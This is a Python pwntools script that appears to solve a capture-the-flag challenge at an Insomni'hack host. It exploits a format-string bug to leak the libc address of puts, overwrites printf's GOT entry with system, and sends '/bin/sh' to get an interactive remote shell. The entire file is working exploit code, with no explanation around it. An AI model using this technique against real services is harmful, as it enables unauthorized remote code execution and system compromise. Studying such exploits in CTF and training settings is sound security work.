#!/usr/bin/env python3
from pwn import *

uu64 = lambda x : u64(x.ljust(8, b'\x00'))

def start(argv=[], *a, **kw):
    return remote('covidless.insomnihack.ch', 6666, *a, **kw)

context.clear(arch = 'amd64')
libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')
# warning/info/debug
context.log_level = 'info'

def get_returned_value():
    data = io.recvline()[29:].split(b',')[0]
    return data

def read_address(addr):
    payload = b"%14$s".ljust(16, b",")
    payload += p64(addr)
    io.sendline(payload)

    data = get_returned_value()
    return data

globalOffsetTable = {
    'puts': 0x601018,
    'printf': 0x601028,
}
io = start()

# lazy linking for puts()
io.sendline(b'')
io.recvuntil(b'\n\n')

libc.address = uu64(read_address(globalOffsetTable['puts'])) - libc.sym.puts
log.info("base = %#x", libc.address)

payload_writes = {
    globalOffsetTable['printf']: libc.sym['system']
}
io.sendline(fmtstr_payload(12, payload_writes, write_size='short'))
io.sendline(b'/bin/sh')
io.interactive()
